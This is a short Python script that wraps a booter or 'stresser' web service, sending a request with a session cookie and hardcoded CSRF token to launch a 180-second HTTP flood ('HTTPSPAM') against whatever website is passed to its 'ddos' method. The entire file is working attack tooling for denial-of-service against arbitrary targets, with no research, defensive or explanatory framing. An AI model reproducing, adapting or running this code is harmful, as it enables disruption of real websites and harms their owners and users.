import httpx

httpx_client: object = httpx.Client(timeout=None) 


class send:
    def __init__(self, cookie: str) -> None:
        self.cookie: str = cookie
        self.base_url = "https://stresser.su"
        
    def ddos(self, website: str, method: str) -> bool:
        try:
            if method.lower() != "https" and method.lower() != "http":
                return False
            else:
                website: str = website.replace("https://", "").replace("http://", "")
                new_url: str = f"{method}://{website}"
                
                headers = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://stresser.su',
                    'referer': 'https://stresser.su/hub',
                    'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'cookie': self.cookie,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                    'x-csrf-token': '2c54c2a7540b77593e7df717a79b395cdlgut6slb845stsjv9cud4fuje1451refCS2a02c7c5ca780004c2fb342eacc5e3frefCS82ec23e3a9510a780b6b72f9460922f2',
                    'x-requested-with': 'XMLHttpRequest'
                }

                payload = {
                    'startAttack': '1',
                    'preset-name-7': '',
                    'start-date': '',
                    'start-time': '',
                    'host[]': new_url,
                    'time': '180',
                    'slots': '1',
                    'origin': 'Worldwide',
                    'method': 'HTTPSPAM'
                }
                
                response = httpx_client.post(f"{self.base_url}/request/hub/start", headers=headers, data=payload)

                print(response.status_code)
                print(response.content)
            
        except:
            return False